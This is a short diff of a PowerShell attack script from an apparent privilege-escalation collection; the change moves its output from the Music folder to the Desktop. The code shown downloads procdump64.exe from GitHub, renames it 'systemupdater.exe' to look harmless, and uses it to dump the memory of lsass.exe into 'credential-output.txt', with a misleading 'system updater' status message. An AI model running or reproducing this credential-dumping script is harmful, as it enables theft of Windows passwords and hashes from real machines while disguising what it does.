@@ -30,7 +30,7 @@ if (-not (Check-SeDebugPrivilege)) {
 
 try {
     $procdumpUrl = "https://github.com/paulkwalton/thescriptvault/raw/refs/heads/main/privesc/windows/procdump64.exe"
-    $desktopPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath("MyMusic"), "systemupdater.exe")
+    $desktopPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath("Desktop"), "systemupdater.exe")
     Invoke-WebRequest -Uri $procdumpUrl -OutFile $desktopPath -UseBasicParsing
     Write-Output "systemupdater.exe downloaded to: $desktopPath"
 } catch {
@@ -38,7 +38,7 @@ try {
 }
 
 try {
-    & $desktopPath -accepteula -ma lsass.exe ([System.IO.Path]::Combine([System.Environment]::GetFolderPath("MyMusic"), "credential-output.txt"))
+    & $desktopPath -accepteula -ma lsass.exe ([System.IO.Path]::Combine([System.Environment]::GetFolderPath("Desktop"), "credential-output.txt"))
     Write-Output "system updater outputting requested files."
 } catch {
     Write-Output "Failed to execute systemupdater.exe: $_"
